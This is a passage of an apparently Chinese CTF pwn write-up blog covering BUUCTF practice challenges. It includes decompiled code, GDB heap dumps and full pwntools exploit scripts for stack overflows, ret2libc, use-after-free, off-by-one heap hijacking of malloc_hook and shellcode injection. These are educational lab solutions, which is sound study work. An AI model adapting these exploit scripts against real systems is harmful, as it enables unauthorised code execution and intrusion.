p64(pop_rdi_ret)+p64(binsh) payload += p64(sys_addr) store(payload) p.sendlineafter(&quot;&gt;&gt;&quot;,&quot;3&quot;) p.interactive() others_shellcode 连上就有 pwn1_sctf_2016 1.checsec 12345Arch: i386-32-littleRELRO: Partial RELROStack: No canary foundNX: NX enabledPIE: No PIE (0x8048000) 2.IDA main 12345int __cdecl main(int argc, const char **argv, const char **envp)&#123; vuln(); return 0;&#125; vuln 12345678910111213141516171819202122232425262728int vuln()&#123; const char *v0; // eax char s; // [esp+1Ch] [ebp-3Ch] char v3; // [esp+3Ch] [ebp-1Ch] char v4; // [esp+40h] [ebp-18h] char v5; // [esp+47h] [ebp-11h] char v6; // [esp+48h] [ebp-10h] char v7; // [esp+4Fh] [ebp-9h] printf(&quot;Tell me something about yourself: &quot;); fgets(&amp;s, 32, edata); std::string::operator=(&amp;input, &amp;s); std::allocator&lt;char&gt;::allocator(&amp;v5); std::string::string(&amp;v4, &quot;you&quot;, &amp;v5); std::allocator&lt;char&gt;::allocator(&amp;v7); std::string::string(&amp;v6, &quot;I&quot;, &amp;v7); replace((std::string *)&amp;v3); std::string::operator=(&amp;input, &amp;v3, &amp;v6, &amp;v4); std::string::~string((std::string *)&amp;v3); std::string::~string((std::string *)&amp;v6); std::allocator&lt;char&gt;::~allocator(&amp;v7); std::string::~string((std::string *)&amp;v4); std::allocator&lt;char&gt;::~allocator(&amp;v5); v0 = (const char *)std::string::c_str((std::string *)&amp;input); strcpy(&amp;s, v0); return printf(&quot;So, %s\\n&quot;, &amp;s);&#125; string 123456789101112131415161718192021LOAD:08048154 00000013 C /lib/ld-linux.so.2............. ........ . ..........LOAD:080488F4 00000007 C strcpyLOAD:080488FB 00000006 C stdinLOAD:08048901 00000007 C printfLOAD:08048908 00000006 C fgetsLOAD:0804890E 0000000D C __cxa_atexitLOAD:0804891B 00000007 C systemLOAD:08048922 00000012 C __libc_start_mainLOAD:08048934 00000008 C GCC_3.0LOAD:0804893C 0000000A C GLIBC_2.0LOAD:08048946 0000000C C GLIBC_2.1.3LOAD:08048952 0000000E C GLIBCXX_3.4.5LOAD:08048960 0000000B C CXXABI_1.3LOAD:0804896B 0000000C C GLIBCXX_3.4.rodata:080497F0 0000000D C cat flag.txt.rodata:08049800 00000023 C Tell me something about yourself: .rodata:08049829 00000008 C So, %s\\n.rodata:08049834 0000002A C basic_string::_S_construct null not valid.eh_frame:0804996F 00000005 C ;*2$\\&quot;.eh_frame:0804999D 00000005 C zPLR 看上去不会溢出，但是把’I’替换成’you’，使字符串变多，栈溢出 3.EXP 123456789from pwn import *#context.log_level = &#x27;debug&#x27;p = remote(&quot;node3.buuoj.cn&quot;,25541)cat_flag = 0x08048F0Dpayload = &#x27;I&#x27;*20 + &#x27;a&#x27;*4 + p64(cat_flag)p.sendline(payload)p.interactive() pwn2_sctf_2016 1.checksec 123456[*] &#x27;/home/o Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) 2.IDA vuln 1234567891011121314int vuln()&#123; char nptr; // [esp+1Ch] [ebp-2Ch] int v2; // [esp+3Ch] [ebp-Ch] printf(&quot;How many bytes do you want me to read? &quot;); get_n((int)&amp;nptr, 4u); v2 = atoi(&amp;nptr); if ( v2 &gt; 32 ) return printf(&quot;No! That size (%d) is too large!\\n&quot;, v2); printf(&quot;Ok, sounds good. Give me %u bytes of data!\\n&quot;, v2); get_n((int)&amp;nptr, v2); return printf(&quot;You said: %s\\n&quot;, &amp;nptr);&#125; get_n 1234567891011121314151617181920int __cdecl get_n(int a1, unsigned int a2)&#123; int v2; // eax int result; // eax char v4; // [esp+Bh] [ebp-Dh] unsigned int v5; // [esp+Ch] [ebp-Ch] v5 = 0; while ( 1 ) &#123; v4 = getchar(); if ( !v4 || v4 == 10 || v5 &gt;= a2 ) break; v2 = v5++; *(_BYTE *)(v2 + a1) = v4; &#125; result = a1 + v5; *(_BYTE *)(a1 + v5) = 0; return result;&#125; 这里就存在一个atoi，输入-1时会转化为非零型整数，造成整数溢出 整数了过后，就可以写更多的值，从而getshell 溢出要覆盖的量可以从gdb调试出来 3.EXP 123456789101112131415161718192021222324252627282930313233343536373839from pwn import *from LibcSearcher import *context.log_level = &quot;debug&quot;elf = ELF(&quot;./pwn2_sctf_2016&quot;)libc = ELF(&quot;./libc-2.23.so&quot;)p = remote(&quot;node3.buuoj.cn&quot;,29632)#p = process(&quot;./pwn2_sctf_2016&quot;)start_addr = 0x080483d0output_addr = 0x080486F8vuln_addr = 0x0804852Fprintf_plt = elf.plt[&#x27;printf&#x27;]printf_got = elf.got[&#x27;printf&#x27;]payload = &#x27;a&#x27;*48 payload += p32(printf_plt) + p32(start_addr) payload += p32(output_addr) + p32(elf.got[&quot;__libc_start_main&quot;])p.recvuntil(&quot;?&quot;)p.sendline(&quot;-1&quot;)p.recv()p.sendline(flat(payload))p.recvuntil(&quot;You said: &quot;) #一段无法输出完整p.recvuntil(&quot;You said: &quot;)main_real = u32(p.recv(4))#libc = LibcSearcher(&#x27;__libc_start_main&#x27;,main_real)libcbase = main_real - libc.sym[&quot;__libc_start_main&quot;]sys_addr = libcbase + libc.sym[&#x27;system&#x27;]binsh = libcbase + libc.search(&quot;/bin/sh\\x00&quot;).next()payload = &#x27;a&#x27;*48 + p32(sys_addr)+p32(output_addr) + p32(binsh)p.recvuntil(&quot;?&quot;)p.sendline(&quot;-1&quot;)p.recvuntil(&quot;!&quot;)p.sendline(payload)p.interactive() pwnable_hack_note 1.checksec 12345Arch: i386-32-littleRELRO: Partial RELROStack: Canary foundNX: NX enabledPIE: No PIE (0x8048000) 2.IDA 基本功能如下 1234567891011121314151617def add(size, content): p.sendlineafter(&quot;Your choice :&quot;, &quot;1&quot;) p.recvuntil(&quot;Note size :&quot;) p.sendline(str(size)) p.recvuntil(&quot;Content :&quot;) p.sendline(content)def delete(index): p.sendlineafter(&quot;Your choice :&quot;, &quot;2&quot;) p.recvuntil(&quot;Index :&quot;) p.sendline(str(index)) def show(index): p.sendlineafter(&quot;Your choice :&quot;, &quot;3&quot;) p.recvuntil(&quot;Index :&quot;) p.sendline(str(index)) delete 123456if ( ptr[v1] ) &#123; free(*((void **)ptr[v1] + 1)); free(ptr[v1]); puts(&quot;Success&quot;); &#125; 指针没有归零 3.GDB 0x1 先申请一个chunk 1234567891011121314151617181920212223242526272829pwndbg&gt; heap0x804b000 FASTBIN &#123; prev_size = 0, size = 17, fd = 0x804862b, bk = 0x804b018, fd_nextsize = 0x0, bk_nextsize = 0x11&#125;0x804b010 FASTBIN &#123; prev_size = 0, size = 17, fd = 0x61616161, bk = 0xa, fd_nextsize = 0x0, bk_nextsize = 0x20fe1&#125;0x804b020 PREV_INUSE &#123; prev_size = 0, size = 135137, fd = 0x0, bk = 0x0, fd_nextsize = 0x0, bk_nextsize = 0x0&#125;0x804b000: 0x00000000 0x00000011 0x0804862b 0x0804b0180x804b010: 0x00000000 0x00000011 0x61616161 0x0000000a0x804b020: 0x00000000 0x00020fe1 0x00000000 0x000000000x804b030: 0x00000000 0x00000000 0x00000000 0x00000000 0x2 查看0x0804862b和0x0804b018 0x0804862b 1234int __cdecl sub_804862B(int a1)&#123; return puts(*(const char **)(a1 + 4));&#125; 0x0804b018 该地址应该是绑定的分配堆的地址，到时候修补上就行 4.思路 uaf，将0x0804862b改为一个我们能泄露的函数 计算system的相对位置 改0x0804862b为system，并传入sh\\x00\\x00 调用原来的输出函数，输出的对象是刚才填入的sh\\x00\\x00 伪造过后 1234560x860b000: 0x00000000 0x00000011 0x0804862b 0x0860b0300x860b010: 0x00000000 0x00000019 0x0860b038 0x616161610x860b020: 0x61616161 0x61616161 0x00000000 0x000000110x860b030: 0x0804862b 0x0804a018 0x00000000 0x000000190x860b040: 0x00000000 0x61616161 0x61616161 0x616161610x860b050: 0x00000000 0x00020fb1 0x00000000 0x00000000 5.EXP 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162from pwn import *import structp = 0def add(size, content): p.sendlineafter(&quot;Your choice :&quot;, &quot;1&quot;) p.recvuntil(&quot;Note size :&quot;) p.sendline(str(size)) p.recvuntil(&quot;Content :&quot;) p.sendline(content)def delete(index): p.sendlineafter(&quot;Your choice :&quot;, &quot;2&quot;) p.recvuntil(&quot;Index :&quot;) p.sendline(str(index)) def show(index): p.sendlineafter(&quot;Your choice :&quot;, &quot;3&quot;) p.recvuntil(&quot;Index :&quot;) p.sendline(str(index))def pwn(ip,port,mode,debug): elf = ELF(&quot;./hacknote&quot;) libc = ELF(&quot;/home/joe1sn/libc/32/libc-2.23.so&quot;) global p if debug == 1: context.log_level = &quot;debug&quot; else: pass if mode == 0: p = process(&quot;./hacknote&quot;) else: p = remote(ip,port) add(0x10,&#x27;a&#x27;*0x10) #note0 add(0x10,&#x27;a&#x27;*0x10) #note1 delete(1) delete(0) fun_addr=0x0804862B add(8,p32(fun_addr)+p32(elf.got[&quot;free&quot;])) show(1) leak=u32(p.recv(4)) libc_base = leak-libc.sym[&quot;free&quot;] sys_addr = libc_base+libc.sym[&quot;system&quot;] success(&#x27;leak addr: &#x27;+hex(leak)) success(&#x27;libc base: &#x27;+hex(libc_base)) success(&#x27;system addr &#x27;+hex(sys_addr)) delete(2) #add(8,p32(sys_addr)+&#x27;;sh;&#x27;) add(8,p32(sys_addr)+&#x27;||sh&#x27;) show(1) p.interactive()if __name__ == &#x27;__main__&#x27;: pwn(&quot;node3.buuoj.cn&quot;,28478,1,0) pwnable_start 1.checksec 12345Arch: i386-32-littleRELRO: No RELROStack: No canary foundNX: NX disabledPIE: No PIE (0x8048000) 2.IDA 123456789101112131415161718192021222324252627; =============== S U B R O U T I N E ======================================= public _start _start proc near ; DATA XREF: LOAD:08048018↑o push esp push offset _exit xor eax, eax xor ebx, ebx xor ecx, ecx xor edx, edx push &#x27;:FTC&#x27; push &#x27; eht&#x27; push &#x27; tra&#x27; push &#x27;ts s&#x27; push 2774654Ch mov ecx, esp ; addr mov dl, 20 ; len mov bl, 1 ; fd mov al, 4 ; syscall(write) int 80h ; LINUX - sys_write xor ebx, ebx ; ebx清零 mov dl, 60 ; len mov al, 3 ; syscall(read) int 80h ; LINUX - add esp, 14h retn.text:0804809C _start endp ; sp-analysis failed 1.向addr空间写入&quot;Let’s start the CTF:&quot;; 2.调用read函数，这里有个栈溢出，溢出后返回addr； 3.返回后向addr写入shellcode； 4.最后溢出+抬栈+shellcode。 3.EXP 1234567891011121314from pwn import *context.log_level = &quot;debug&quot;p = process(&#x27;./start&#x27;)p = remote(&quot;node3.buuoj.cn&quot;,27809)payload = &#x27;a&#x27;*20 + p32(0x08048087)p.recvuntil(&#x27;:&#x27;)p.send(payload)print(payload)leak=u32(p.recv(4));print(leak)shellcode= &#x27;\\x31\\xc9\\xf7\\xe1\\x51\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\xb0\\x0b\\xcd\\x80&#x27;payload= &#x27;a&#x27;*20 + p32(leak+20)+shellcodep.send(payload)p.interactive() pwnable_orw 1.checksec 123456Arch: i386-32-littleRELRO: Partial RELROStack: Canary foundNX: NX disabledPIE: No PIE (0x8048000)RWX: Has RWX segments 2.IDA main 12345678int __cdecl main(int argc, const char **argv, const char **envp)&#123; orw_seccomp(); printf(&quot;Give my your shellcode:&quot;); read(0, &amp;shellcode, 0xC8u); ((void (*)(void))shellcode)(); return 0;&#125; 直接传入shellcode过后，执行shellcode 3.EXP 1234567891011from pwn import *context.log_level = &quot;debug&quot;p = remote(&quot;node3.buuoj.cn&quot;,26098)shellcode = shellcraft.open(&#x27;/flag&#x27;)shellcode += shellcraft.read(&#x27;eax&#x27;,&#x27;esp&#x27;,100)shellcode += shellcraft.write(1,&#x27;esp&#x27;,100)shellcode = asm(shellcode)p.recvuntil(&quot;Give my your shellcode:&quot;)p.sendline(shellcode)p.interactive() roarctf_2019_easy_pwn 1.checksec 12345Arch: amd64-64-littleRELRO: Full RELROStack: Canary foundNX: NX enabledPIE: PIE enabled 2.IDA 四个功能：增删查改 123456789101112131415161718192021def add(size): p.recvuntil(&#x27;choice: &#x27;) p.sendline(&#x27;1&#x27;) p.recvuntil(&#x27;size:&#x27;) p.sendline(str(size))def edit(index,size,data): p.sendlineafter(&quot;: &quot;,&#x27;2&#x27;) p.sendlineafter(&quot;: &quot;,str(index)) p.sendlineafter(&quot;: &quot;,str(size)) p.recvuntil(&#x27;content:&#x27;) p.send(data)def free(index): p.sendlineafter(&quot;: &quot;,&#x27;3&#x27;) p.recvuntil(&#x27;index:&#x27;) p.sendline(str(index))def show(index): p.sendlineafter(&quot;: &quot;,&#x27;4&#x27;) p.sendlineafter(&quot;: &quot;,str(index)) edit 123456789101112131415if ( v2 &gt;= 0 &amp;&amp; v2 &lt;= 15 )&#123; v2 = *((_DWORD *)&amp;unk_202040 + 4 * v2); if ( v2 == 1 ) &#123; printf(&quot;size: &quot;); v2 = read_input(1); v4 = vuln(*((_DWORD *)&amp;unk_202044 + 4 * v3), v2);// off by one if ( v2 &gt; 0 ) &#123; printf(&quot;content: &quot;, (unsigned int)v2); v2 = sub_D92(qword_202048[2 * v3], v4); &#125; &#125;&#125; off by one漏洞,导致我们个已覆盖下一个堆块的size域，从而实现chunk overlapping 3.GDB 12345678910111213141516171819202122232425262728#code add(0x18)#0 add(0x18)#1 add(0x88)#2 add(0x88)#3 add(0x28)#4 add(0x28)#5 add(0x68)#6 edit(0,0x18+10,&#x27;a&#x27;*0x18+&#x27;\\xb1&#x27;)#off by one #1.szie=0x18 2.size=0x98 #1.size+2.size=chunk_add.size=0xb0 # 0x10+8 like this is more conviente to use # not to add sth like p64(0) gdb.attach(p)#GDBpwndbg&gt; x/32gx 0x55a813ab90000x55a813ab9000: 0x0000000000000000 0x00000000000000210x55a813ab9010: 0x6161616161616161 0x61616161616161610x55a813ab9020: 0x6161616161616161 0x00000000000000b1 这里已经被修改为&#x27;\\xb1&#x27;0x55a813ab9030: 0x0000000000000000 0x00000000000000000x55a813ab9040: 0x0000000000000000 0x00000000000000910x55a813ab9050: 0x0000000000000000 0x00000000000000000x55a813ab9060: 0x0000000000000000 0x0000000000000000&gt;这样我们free(1)，就会得到`libc base`了 12345678910111213141516171819202122232425262728293031#code free(1) add(0xa8)#1 #gdb.attach(p) edit(1,0x20,&#x27;a&#x27;*0x18+p64(0x91))#repair #gdb.attach(p) free(2) show(1) #leak gdb.attach(p)#GDBpwndbg&gt; binfastbins.........unsortedbinall: 0x55d9d3909040 —▸ 0x7ff8d0bbab78 (main_arena+88) ◂— 0x55d9d3909040..........pwndbg&gt; x/32gx 0x55d9d39090000x55d9d3909000: 0x0000000000000000 0x00000000000000210x55d9d3909010: 0x6161616161616161 0x61616161616161610x55d9d3909020: 0x6161616161616161 0x00000000000000b10x55d9d3909030: 0x6161616161616161 0x61616161616161610x55d9d3909040: 0x6161616161616161 0x00000000000000910x55d9d3909050: 0x00007ff8d0bbab78 0x00007ff8d0bbab780x55d9d3909060: 0x0000000000000000 0x00000000000000000x55d9d3909070: 0x0000000000000000 0x0000000000000000&gt;再输出chunk1的内容就可以输出`0x00007ff8d0bbab78`,从而泄露`libc base`最后输出[+] libc base=&gt;0x7ff8d07f6000[+] malloc hook=&gt;0x7ff8d0bbab10[+] realloc hook=&gt;0x7ff8d087a6c0[+] one gadget=&gt;0x7ff8d083b26a 1234567891011121314151617181920212223242526272829303132这里我们用的one_gadget是0x4526a execve(&quot;/bin/sh&quot;, rsp+0x30, environ)constraints: [rsp+0x30] == NULL所以需要满足条件[rsp+0x30] == NULL,这就需要realloc来对栈上的东西进行微调#code edit(4,0x32,&#x27;a&#x27;*0x28+&#x27;\\xa1&#x27;) #off by one #gdb.attach(p) free(5) free(6) add(0x98)#2 edit(2,0x38,&#x27;a&#x27;*0x28+p64(0x71)+p64(malloc_hook-0x23)) #new 2 take the 5&#x27;s place and hijack 6 to malloc hook #gdb.attach(p) add(0x68)#5 add(0x68)#6 in malloc hook edit(6,27,&#x27;a&#x27;*(0x13-8)+p64(one_gadget)+p64(realloc)) gdb.attach(p)&gt;修改realloc_hook为onegadget，修改malloc_hook为realloc+偏移地址#GDB&gt;断点过后走几个单步pwndbg&gt; x/16gx $rsp+0x300x7ffeb950d680: 0x0000000000000000 0x00007f5695fa773b0x7ffeb950d690: 0x00007ffeb950d8db 0x00007f56961d99a00x7ffeb950d6a0: 0x0000000000000000 0x00000000000000000x7ffeb950d6b0: 0x0000000000000000 0x00007f5695fa773b0x7ffeb950d6c0: 0x0000000000000000 0x00007ffeb950dd580x7ffeb950d6d0: 0x0000000000000000 0x00000000000000000x7ffeb950d6e0: 0x0000000000000000 0x00007ffeb950d8f00x7ffeb950d6f0: 0x0000000000000064 0x0000004000000000&gt; 调用了过后就达成了 4.EXP 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182from pwn import *context.log_level = &quot;debug&quot;elf = ELF(&quot;./roarctf_2019_easy_pwn&quot;)libc=ELF(&#x27;/home/joe1sn/libc/64/libc-2.23.so&#x27;)p = process(&quot;./roarctf_2019_easy_pwn&quot;)def add(size): p.recvuntil(&#x27;choice: &#x27;) p.sendline(&#x27;1&#x27;) p.recvuntil(&#x27;size:&#x27;) p.sendline(str(size))def edit(index,size,data): p.sendlineafter(&quot;: &quot;,&#x27;2&#x27;) p.sendlineafter(&quot;: &quot;,str(index)) p.sendlineafter(&quot;: &quot;,str(size)) p.recvuntil(&#x27;content:&#x27;) p.send(data)def free(index): p.sendlineafter(&quot;: &quot;,&#x27;3&#x27;) p.recvuntil(&#x27;index:&#x27;) p.sendline(str(index))def show(index): p.sendlineafter(&quot;: &quot;,&#x27;4&#x27;) p.sendlineafter(&quot;: &quot;,str(index)) if __name__ == &#x27;__main__&#x27;: add(0x18)#0 add(0x18)#1 add(0x88)#2 add(0x88)#3 add(0x28)#4 add(0x28)#5 add(0x68)#6 edit(0,0x18+10,&#x27;a&#x27;*0x18+&#x27;\\xb1&#x27;)#off by one #1.szie=0x18 2.size=0x98 #1.size+2.size=chunk_add.size=0xb0 # 0x10+8 like this is more conviente to use # not to add sth like p64(0) #gdb.attach(p) free(1) add(0xa8)#1 #gdb.attach(p) edit(1,0x20,&#x27;a&#x27;*0x18+p64(0x91))#repair #gdb.attach(p) free(2) show(1) #leak #gdb.attach(p) p.recvuntil(&#x27;content: &#x27;) libc_base=u64(p.recvuntil(&quot;\\x7f\\x00\\x00&quot;)[-8:])-0x3c4b78 print(hex(libc_base)) malloc_hook=libc_base+libc.sym[&#x27;__malloc_hook&#x27;] realloc = libc_base + libc.symbols[&#x27;__libc_realloc&#x27;] one_gadget=libc_base+0x4526a log.success(&quot;libc base=&gt;0x%x&quot;,libc_base) log.success(&quot;malloc hook=&gt;0x%x&quot;,malloc_hook) log.success(&quot;realloc hook=&gt;0x%x&quot;,realloc) log.success(&quot;one gadget=&gt;0x%x&quot;,one_gadget) &#x27;&#x27;&#x27; add(0x28)#4 add(0x28)#5 add(0x68)#6 &#x27;&#x27;&#x27; edit(4,0x32,&#x27;a&#x27;*0x28+&#x27;\\xa1&#x27;) #off by one #gdb.attach(p) free(5) free(6) add(0x98)#2 edit(2,0x38,&#x27;a&#x27;*0x28+p64(0x71)+p64(malloc_hook-0x23)) #new 2 take the 5&#x27;s place and hijack 6 to malloc hook #gdb.attach(p) add(0x68)#5 add(0x68)#6 in malloc hook edit(6,27,&#x27;a&#x27;*(0x13-8)+p64(one_gadget)+p64(realloc)) gdb.attach(p) add(0x10) p.interactive() rip 1.checksec 123456Arch: amd64-64-littleRELRO: Partial RELROStack: No canary foundNX: NX disabledPIE: No PIE (0x400000)RWX: Has RWX segments 2.IDA main 12345678910int __cdecl main(int argc, const char **argv, const char **envp)&#123; char s; // [rsp+1h] [rbp-Fh] puts(&quot;please input&quot;); gets(&amp;s, argv); puts(&amp;s); puts(&quot;ok,bye!!!&quot;); return 0;&#125; string 123456789101112LOAD:00000000004002A8 0000001C C /lib64/ld-linux-x86-64.so.2LOAD:00000000004003B9 0000000A C libc.so.6LOAD:00000000004003C3 00000005 C getsLOAD:00000000004003C8 00000005 C putsLOAD:00000000004003CD 00000007 C systemLOAD:00000000004003D4 00000012 C __libc_start_mainLOAD:00000000004003E6 0000000C C GLIBC_2.2.5LOAD:00000000004003F2 0000000F C __gmon_start__.rodata:0000000000402004 0000000D C please input.rodata:0000000000402011 0000000A C ok,bye!!!.rodata:000000000040201B 00000008 C /bin/sh.eh_frame:00000000004020DF 00000006 C ;*3$\\&quot; gets函数漏洞，有/bin/sh 3.EXP 1234567from pwn import *#context.log_level = &quot;debug&quot;p = remote(&quot;node3.buuoj.cn&quot;,27035)binsh_addr = 0x401186payload = &#x27;\\x00&#x27;*0xf + p64(binsh_addr)p.sendline(payload)p.interactive() warmup_csaw_2016 1.checksec 123456Arch: amd64-64-littleRELRO: Partial RELROStack: No canary foundNX: NX disabledPIE: No PIE (0x400000)RWX: Has RWX segments 2.IDA main 123456789101112__int64 __fastcall main(__int64 a1, char **a2, char **a3)&#123; char s; // [rsp+0h] [rbp-80h] char v5; // [rsp+40h] [rbp-40h] write(1, &quot;-Warm Up-\\n&quot;, 0xAuLL); write(1, &quot;WOW:&quot;, 4uLL); sprintf(&amp;s, &quot;%p\\n&quot;, sub_40060D); write(1, &amp;s, 9uLL); write(1, &quot;&gt;&quot;, 1uLL); return gets(&amp;v5, &quot;&gt;&quot;);&#125; string 12345678910111213LOAD:0000000000400238 0000001C C /lib64/ld-linux-x86-64.so.2LOAD:0000000000400361 0000000A C libc.so.6LOAD:000000000040036B 00000005 C getsLOAD:0000000000400370 00000008 C sprintfLOAD:0000000000400378 00000007 C systemLOAD:000000000040037F 00000012 C __libc_start_mainLOAD:0000000000400391 00000006 C writeLOAD:0000000000400397 0000000F C __gmon_start__LOAD:00000000004003A6 0000000C C GLIBC_2.2.5.rodata:0000000000400734 0000000D C cat flag.txt.rodata:0000000000400741 0000000B C -Warm Up-\\n.rodata:000000000040074C 00000005 C WOW:.eh_frame:00000000004007FF 00000006 C ;*3$\\&quot; gets溢出，system函数和cat flag字符串 3.EXP 12345678910from pwn import *#context.log_level = &#x27;debug&#x27;p = remote(&quot;node3.buuoj.cn&quot;,28792)cat_flag = 0x40060dpayload = &#x27;\\x00&#x27;*(0x40+8) + p64(cat_flag)p.sendlineafter(&quot;&gt;&quot;,payload)print p.recv()p.interactive() wdb2018_guess 一道思路清奇的题 checksec 12345Arch: amd64-64-littleRELRO: Partial RELROStack: Canary foundNX: NX enabledPIE: No PIE (0x400000) 反汇编 可以看出 **1.**flag文件被读取到了栈上面 **2.**主程序创建(fork)了三个线程 **3.**在这个线程里面，程序将我们的输入和站上面的flag进行比较 **4.**我们输入的时候调用了gets，导致栈溢出 GDB调试 1. 输入后，在strcmp断点 我们溢出0x128就可以覆盖 _libc_arg[0] 的值，从而泄露数据 2. 找到flag的内存位置 这个我们可以从环境变量入手，找到_libc_environ，然后再根据相对偏移找到flag在栈上的地址 知识点 程序开启了canary保护，这里有个之前我忽略的点 canary的检查报错 源码如下 1234567891011void __attribute__ ((noreturn)) __stack_chk_fail (void)&#123; __fortify_fail (&quot;stack smashing detected&quot;);&#125;void __attribute__ ((noreturn)) internal_function __fortify_fail (const char *msg) &#123; /* The loop is added only to keep gcc happy. */ while (1) __libc_message (2, &quot;*** %s ***: %s terminated\\n&quot;, msg, __libc_argv[0] ?: &quot;&lt;unknown&gt;&quot;);&#125; 程序输出的时候使用了 __libc_argv[0] 来打印程序的名称，所以就可以从这里泄露一些信息 这里拓展一下 argc：命令的条数 argv[]：输入的每条命令 1234567891011#include &lt;iostream&gt;using std::cout;using std::cin;using std::endl;int main(int argc, char *argv[])&#123; for (int i = 0; i &lt; argc; ++i) cout&lt;&lt;argv[i]&lt;&lt;endl; return 0;&#125; 输出 那么argv[0]=程序的名称(也是第0条指令) _libc_environ 在libc中保存了一个函数叫_environ，存的是当前进程的环境变量 如何从libc地址得到栈地址这里面就详细写了这个函数 攻击步骤 1. 泄露libc 2. 泄露_libc_arg的表头 environ，从而找到flag在站上面的地址 3. 覆盖 **libc_arg[0]**为flag在栈上面的地址，最后通过 stack_smashing 泄露出flag EXP 123456789101112131415161718192021222324252627282930313233343536373839404142434445from pwn import *name = &quot;guess&quot;elf = ELF(name)# libc = ELF(&quot;/lib/i386-linux-gnu/libc.so.6&quot;)# libc = ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)libc = ELF(&quot;libc-2.23.so&quot;)sh = 0def main(ip,port,debug,mode): global sh if debug==0: context.log_level = &quot;debug&quot; else: pass if mode==0: sh = process(name) else: sh = remote(ip,port) payload = &quot;A&quot;*0x128 payload += p64(elf.got[&quot;read&quot;]) sh.sendlineafter(&quot;Please type your guessing flag\\n&quot;,payload) sh.recvuntil(&#x27;stack smashing detected ***: &#x27;) libc_base = u64(sh.recv(6).ljust(8,&#x27;\\x00&#x27;))-libc.sym[&quot;read&quot;] system = libc_base + libc.sym[&quot;system&quot;] environ = libc_base+libc.sym[&#x27;__environ&#x27;] info(&quot;libc base -&gt; &quot;+hex(libc_base)) info(&quot;libc_system -&gt; &quot;+hex(system)) info(&quot;__libc_environ -&gt; &quot;+hex(environ)) payload = &quot;A&quot;*0x128 payload += p64(environ) sh.sendlineafter(&quot;Please type your guessing flag\\n&quot;,payload) en_list = u64(sh.recvuntil(&quot;\\x7f&quot;)[-6:].ljust(8,&#x27;\\x00&#x27;)) info(&quot;environ -&gt; &quot;+hex(en_list)) payload=&quot;A&quot;*0x128 payload += p64(en_list-0x168) sh.sendlineafter(&quot;Please type your guessing flag\\n&quot;,payload) sh.recvuntil(&quot;*** stack smashing detected ***: &quot;) print sh.recvline()if __name__ == &#x27;__main__&#x27;: main(&quot;node3.buuoj.cn&quot;,&quot;26263&quot;,1,1) xdctf2015_pwn200 EXP 1234567891011121314151617181920212223242526272829303132333435from pwn import *from LibcSearcher import *context.log_level = &quot;debug&quot;elf = ELF(&quot;./bof&quot;)#p = process(&quot;./bof&quot;)p = remote(&quot;node3.buuoj.cn&quot;,27377)write_got = elf.got[&quot;write&quot;]write_plt = elf.plt[&quot;write&quot;]main = elf.sym[&quot;main&quot;]payload = &#x27;a&#x27;*(0x6c+4)payload += p32(write_plt)+p32(main)payload += p32(1)+p32(write_got)+p32(4)p.recvuntil(&quot;Welcome to XDCTF2015~!\\n&quot;)p.sendline(payload)leak_addr = u32(p.recvuntil(&#x27;\\xf7&#x27;)[-4:])libc = LibcSearcher(&quot;write&quot;,leak_addr)base = leak_addr-libc.dump(&quot;write&quot;)sys_addr = base+libc.dump(&quot;system&quot;)binsh = base+libc.dump(&quot;str_bin_sh&quot;)log.success(&quot;libc base=&gt;%x&quot;,base)log.success(&quot;system addr=&gt;%x&quot;,sys_addr)log.success(&quot;binsh=&gt;%x&quot;,binsh)p.recvuntil(&quot;Welcome to XDCTF2015~!\\n&quot;)payload = &#x27;a&#x27;*(0x6c+4)payload += p32(sys_addr)+p32(main)payload += p32(binsh)p.sendline(payload)p.interactive() 铁人三项(第五赛区)_2018_rop 1.checksec 12345Arch: i386-32-littleRELRO: Partial RELROStack: No canary foundNX: NX enabledPIE: No PIE (0x8048000) 2.IDA vulnerable_function 123456ssize_t vulnerable_function()&#123; char buf; // [esp+10h] [ebp-88h] return read(0, &amp;buf, 0x100u);&#125; 溢出+libc leak 3.EXP 1234567891011121314151617181920212223242526272829303132from pwn import *context.log_level = &quot;debug&quot;p = remote(&quot;node3.buuoj.cn&quot;,26402)elf = ELF(&quot;./2018_rop&quot;)libc = ELF(&quot;./libc-2.27.so&quot;)read_plt = elf.plt[&quot;read&quot;]read_got = elf.got[&quot;read&quot;]write_plt = elf.plt[&quot;write&quot;]write_got = elf.got[&quot;write&quot;]main_addr = elf.sym[&quot;main&quot;]payload = &quot;a&quot;*(0x88+4)payload += p32(write_plt)+p32(main_addr)payload += p32(1)+p32(write_got)+p32(4)p.sendline(payload)leak_addr = u32(p.recv(4))libc_base = leak_addr - libc.sym[&quot;write&quot;]sys_addr = libc_base + libc.sym[&quot;system&quot;]binsh = libc_base + libc.search(&#x27;/bin/sh&#x27;).next()log.info(&quot;libc base=&gt;%x&quot;,libc_base)log.info(&quot;system addr=&gt;%x&quot;,sys_addr)log.info(&quot;/bin/sh addr=&gt;%x&quot;,binsh)payload = &#x27;a&#x27;*(0x88+4)payload += p32(sys_addr)+p32(main_addr)payload += p32(binsh)p.sendline(payload)p.interactive()","categories":[{"name":"writeup","slug":"writeup","permalink":"https://joe1sn.eu.org/categories/writeup/"}],"tags":[{"name":"writeup","slug":"writeup","permalink":"https://joe1sn.eu.org/tags/writeup/"},{"name":"pwn","slug":"pwn","permalink":"https://joe1sn.eu.org/tags/pwn/"},{"name":"BUUCTF","slug":"BUUCTF","permalink":"https://joe1sn.eu.org/tags/BUUCTF/"}]}],"categories":[{"name":"notes","slug":"notes","permalink":"https://joe1sn.eu.org/categories/notes/"},{"name":"program","slug":"program","permalink":"https://joe1sn.eu.org/categories/program/"},{"name":"kernel","slug":"notes/kernel","permalink":"https://joe1sn.eu.org/categories/notes/kernel/"},{"name":"CVE","slug":"CVE","permalink":"https://joe1sn.eu.org/categories/CVE/"},{"name":"hardware","slug":"hardware","permalink":"https://joe1sn.eu.org/categories/hardware/"},{"name":"writeup","slug":"writeup","permalink":"https://joe1sn.eu.org/categories/writeup/"},{"name":"os","slug":"notes/os","permalink":"https://joe1sn.eu.org/categories/notes/os/"},{"name":"misc","slug":"misc","permalink":"https://joe1sn.eu.org/categories/misc/"},{"name":"pentest","slug":"pentest","permalink":"https://joe1sn.eu.org/categories/pentest/"},{